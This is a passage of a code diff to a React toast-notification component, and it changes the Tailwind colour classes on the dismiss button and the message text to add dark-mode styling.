                 }`}>
                   {t.type === 'SUCCESS' ? '✓ SYSTEM CONFIRMED' : t.type === 'ERROR' ? '⚠ ACTION REJECTED' : 'ℹ TRANSACTION INFO'}
                 </span>
                 <button
                   type="button"
                   onClick={() => setToasts((prev) => prev.filter((item) => item.id !== t.id))}
-                  className="text-gray-500 hover:text-gray-300 transition-colors pointer-events-auto"
+                  className="text-gray-400 hover:text-gray-950 dark:hover:text-white transition-colors pointer-events-auto"
                 >
                   <X className="w-3 h-3" />
                 </button>
               </div>
-              <p className="text-gray-200 text-xs font-semibold leading-relaxed">
+              <p className="text-gray-850 dark:text-gray-300 text-xs font-semibold leading-relaxed">
                 {t.message}
               </p>
             </div>
